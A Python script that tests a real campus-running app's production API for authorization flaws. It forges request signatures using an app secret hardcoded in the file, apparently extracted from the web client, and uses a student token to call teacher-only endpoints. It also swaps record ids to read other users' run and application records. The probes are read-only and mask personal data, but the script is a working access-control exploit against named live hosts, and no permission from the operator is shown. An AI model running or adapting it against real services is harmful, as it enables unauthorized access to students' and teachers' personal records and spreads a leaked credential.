#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
campus_test.py —— 校园跑 API 授权测试（只读扫，默认不发任何写请求）

钥匙（2026-10-15 全部取证确认）：
  · 主机：school-api.dingxinwen.cn（积分在 points.dingxinwen.cn）
  · 签名：sign = md5( 排序 "k=v" 直连 + web_app_secret )，参数 {app_id, timestamp, token}
  · 凭据：app_id=210710201732916889 + web_secret（H5 明文）
  · token：.token 里的 `u_token:<...>`，**必须带前缀**（去前缀→"用户未登录"）

测试项（全部 GET，只读）：
  A 教师端越权（BFLA）：学生 token 读教师接口 studentList / report / appealList / applyForList
  B 水平越权（IDOR）：runRecord/detail、applyFor/detail 换 id
  C 自身数据基线：personalInfo / runRecord/getList / applyFor/getList / studentTeacher/getList
  D 报表与积分：myCurr / schoolReport / topList / myPoints

输出里对姓名、手机号、头像等 PII 一律打码。
"""
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

TOKEN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".token")
WEB_ID = "210710201732916889"
WEB_SECRET = "594578ce51b456787f2e97ec76e2fff4"
SCHOOL = "school-api.dingxinwen.cn"
POINTS = "points.dingxinwen.cn"
UA = ("Mozilla/5.0 (Linux; Android 16; Pixel 8) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

PII_KEYS = {"name", "ddNickName", "u_cellphone", "cellphone", "mobile", "idCard",
            "id_card", "avatar", "u_name", "realName", "phone", "ddTel", "open_id"}


def mask_obj(o):
    if isinstance(o, dict):
        return {k: ("***" if k in PII_KEYS else mask_obj(v)) for k, v in o.items()}
    if isinstance(o, list):
        return [mask_obj(x) for x in o[:3]]
    if isinstance(o, str) and len(o) > 60:
        return o[:40] + "…"
    return o


def call(host, path, token, extra=None, timeout=15):
    p = {"app_id": WEB_ID, "timestamp": str(int(time.time())), "token": token}
    if extra:
        p.update({k: str(v) for k, v in extra.items()})
    plain = "".join(f"{k}={p[k]}" for k in sorted(p))
    p["sign"] = hashlib.md5((plain + WEB_SECRET).encode()).hexdigest()
    url = f"https://{host}{path}?" + urllib.parse.urlencode(p)
    req = urllib.request.Request(url, headers={"User-Agent": UA,
                                               "Accept": "application/json, text/plain, */*"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return -1, f"ERR {type(e).__name__}: {e}"


def verdict(body: str) -> str:
    if "用户未登录" in body:
        return "未登录"
    if "无权限" in body or "没有权限" in body or "403" in body:
        return "无权限 ✅(正确拒绝)"
    try:
        j = json.loads(body)
    except Exception:
        return "非JSON"
    if j.get("code") == 0:
        return "★ 返回了数据（需人工判读）"
    return f"拒绝/异常 code={j.get('code')} msg={j.get('msg')}"


def main():
    tok = open(TOKEN_FILE).read().strip()
    if not tok:
        print("没有 .token")
        return 2
    print("=" * 78)
    print("校园跑 API 只读授权测试")
    print(f"token = {tok[:7]}…{tok[-4:]}（长度 {len(tok)}）")
    print("=" * 78)

    groups = [
        ("C 自身数据基线（对照）", [
            (SCHOOL, "/api/login/personalInfo", None),
            (SCHOOL, "/api/login/personalInfo ", None),
            (SCHOOL, "/api/semester/currSemester", None),
            (SCHOOL, "/api/runRecord/getList", {"page": 1, "size": 5}),
            (SCHOOL, "/api/applyFor/getList", {"page": 1, "size": 5}),
            (SCHOOL, "/api/studentTeacher/getList", None),
        ]),
        ("A 教师端越权（学生 token 打教师接口）", [
            (SCHOOL, "/api/teacherReport/studentList", {"page": 1, "size": 5}),
            (SCHOOL, "/api/teacherReport/report", None),
            (SCHOOL, "/api/teacherReport/appealList", {"page": 1, "size": 5}),
            (SCHOOL, "/api/teacherReport/applyForList", {"page": 1, "size": 5}),
        ]),
        ("D 报表 / 积分", [
            (SCHOOL, "/api/runReport/myCurr", None),
            (SCHOOL, "/api/runReport/schoolReport", None),
            (SCHOOL, "/api/runReport/topList", {"page": 1, "size": 5}),
            (POINTS, "/api/points/myPoints", None),
        ]),
        ("B 水平越权探测（换 id，只读）", [
            (SCHOOL, "/api/runRecord/detail", {"id": 1}),
            (SCHOOL, "/api/runRecord/detail", {"id": 100}),
            (SCHOOL, "/api/applyFor/detail", {"id": 1}),
            (SCHOOL, "/api/applyFor/detail", {"id": 100}),
        ]),
    ]

    results = []
    for title, items in groups:
        print(f"\n### {title}")
        for host, path, extra in items:
            st, body = call(host, path, tok, extra)
            v = verdict(body)
            results.append((path, extra, st, v, body))
            q = ("?" + urllib.parse.urlencode(extra)) if extra else ""
            print(f"  [{st}] {path}{q}")
            print(f"        {v}")
            if v.startswith("★"):
                try:
                    j = json.loads(body)
                    print(f"        data: {json.dumps(mask_obj(j.get('data')), ensure_ascii=False)[:420]}")
                except Exception:
                    pass
            time.sleep(0.4)

    print("\n" + "=" * 78)
    print("汇总（★ = 需要人工判断的『返回了数据』）")
    for path, extra, st, v, _ in results:
        q = ("?" + urllib.parse.urlencode(extra)) if extra else ""
        print(f"  {'★' if v.startswith('★') else ' '} {path}{q:<22} [{st}] {v}")
    print("\n只读扫完成；写类测试点（appeal/save/audit/bind）需你明确批准后再跑。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
